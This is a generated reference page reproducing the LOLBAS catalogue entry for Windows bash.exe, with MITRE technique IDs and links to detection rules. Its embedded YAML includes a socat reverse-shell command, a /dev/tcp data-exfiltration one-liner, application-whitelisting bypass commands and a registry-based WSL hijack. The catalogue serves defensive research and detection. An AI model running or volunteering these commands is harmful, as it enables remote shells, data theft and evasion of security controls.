---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Bash.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `bash.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Bash.exe](../../tools/windows/bash.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | bash.exe |
| name | Bash.exe |
| type | tool |
| source | lolbas |
| url | https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@aionescu'
  Person: Alex Ionescu
- Handle: '@d1r4c'
  Person: Asif Matadar
- Person: Liran Ravich, CardinalOps
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: bash.exe -c "{CMD}"
  Description: Executes executable from bash.exe
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: Execute
  Command: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
  Description: Executes a reverse shell
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: Execute
  Command: bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
  Description: Exfiltrate data
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used as a defensive evasion.
- Category: AWL Bypass
  Command: bash.exe -c "{CMD}"
  Description: Executes executable from bash.exe
  MitreID: T1202
  OperatingSystem: Windows 10
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of specified file, can be used to bypass Application Whitelisting.
- Category: Execute
  Command: bash.exe
  Description: When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`,
    which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file
    named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.
  MitreID: T1218
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execute a payload as a child process of `bash.exe` while masquerading as WSL.
Created: 2018-05-25
Description: File used by Windows subsystem for Linux
Detection:
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
- IOC: Child process from bash.exe
Full_Path:
- Path: C:\Windows\System32\bash.exe
- Path: C:\Windows\SysWOW64\bash.exe
Name: Bash.exe
Resources:
- Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Link: https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Bash.yml
```

## Detection / Analysis Notes

```text
BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
```

```text
IOC: Child process from bash.exe
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
```

```text
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
- IOC: Child process from bash.exe
```
